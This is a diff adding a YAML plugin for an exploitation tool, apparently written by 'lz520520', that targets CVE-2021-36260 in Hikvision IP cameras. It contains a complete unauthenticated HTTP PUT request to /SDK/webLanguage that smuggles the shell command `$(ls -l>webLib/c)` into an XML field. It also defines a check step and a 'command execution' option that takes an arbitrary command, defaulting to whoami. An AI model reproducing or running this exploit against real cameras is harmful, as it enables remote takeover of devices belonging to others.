@@ -1,0 +1,36 @@
+info:
+    app: hikvision
+    name: CVE_2021_36260
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: ""
+    create_date: "2024-10-06 07:38:04"
+    update_date: "2024-10-06 07:38:04"
+    scope: 海康威视摄像头
+    vul_id: CVE-2021-36260
+    payload: |-
+        PUT /SDK/webLanguage HTTP/1.1
+        User-Agent: python-requests/2.22.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: x.x.x.x
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Language: en-US,en;q=0.9,sv;q=0.8
+        Content-Length: 71
+
+        <?xml version="1.0" encoding="UTF-8"?><language>$(ls -l>webLib/c)</language>
+    reference: https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html
+    vul_type: 命令执行
+payloads:
+    - name: getmsg1
+      alias: 检测漏洞
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
